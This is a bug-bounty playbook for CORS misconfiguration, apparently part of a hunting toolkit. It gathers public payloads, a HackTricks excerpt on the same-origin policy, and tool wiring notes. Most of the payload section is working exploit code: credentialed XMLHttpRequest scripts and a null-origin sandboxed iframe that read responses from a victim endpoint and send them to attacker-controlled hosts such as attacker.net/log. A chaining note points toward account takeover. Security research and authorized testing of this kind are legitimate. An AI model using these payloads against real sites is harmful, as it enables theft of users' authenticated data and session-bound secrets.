# Real-World Playbook — CORS Misconfiguration

**Class:** `cors` · **Coverage-matrix tier:** 1 · **Hunter2:** /cors · tools/cors_scanner.py · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```
```
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```
```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### CORS - Misconfigurations & Bypass



#### What is CORS?

Cross-Origin Resource Sharing (CORS) standard **enables servers to define who can access their assets** and **which HTTP request methods are permitted** from external sources.<sup>[[5]](#references)</sup>

A **same-origin** policy mandates that a **server requesting** a resource and the server hosting the **resource** share the same protocol (e.g., `http://`), domain name (e.g., `internal-web.com`), and **port** (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.<sup>[[1]](#references)</sup>

The application of the same-origin policy in the context of `http://normal-website.com/example/example.html` is illustrated as follows:

| URL accessed                              | Access permitted?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Yes: Identical scheme, domain, and port |
| `http://normal-website.com/example2/`     | Yes: Identical scheme, domain, and port |
| `https://normal-website.com/example/`     | No: Different scheme and port           |
| `http://en.normal-website.com/example/`   | No: Different domain                    |
| `http://www.normal-website.com/example/`  | No: Different domain                    |
| `http://normal-website.com:8080/example/` | No: Different port\*                    |

\*Internet Explorer disregards the port number in enforcing the same-origin policy, thus allowing this access.

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- ACAO reflects Origin + ACAC:true → exfil authed data cross-site
- null origin / suffix-match regex bypass → data theft → chain to ATO

## Hunter2 wiring
- **Run:** `/cors · tools/cors_scanner.py`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
